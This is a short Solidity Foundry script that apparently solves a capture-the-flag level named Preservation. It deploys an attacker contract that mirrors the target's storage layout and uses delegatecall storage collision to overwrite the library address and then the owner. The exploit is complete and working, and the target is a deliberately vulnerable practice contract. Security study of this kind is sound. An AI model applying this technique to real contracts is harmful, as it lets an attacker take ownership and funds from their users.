// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Preservation, LibraryContract} from "../src/Level16.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address sender = vm.addr(privateKey);

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x20FD051bF1d72a491674d9259dc7a155160bdF9d;
        Preservation level = Preservation(levelAddr);

        Attacker attacker = new Attacker();

        // 第一次调用把 timeZone1Library1 改为攻击者地址
        level.setFirstTime(uint256(uint160(address(attacker))));

        // 第二次调用其实是 delegatecall attacker 的 setTime 函数把 owner 设置为 sender
        level.setFirstTime(uint256(uint160(address(sender))));

        vm.stopBroadcast();
    }
}
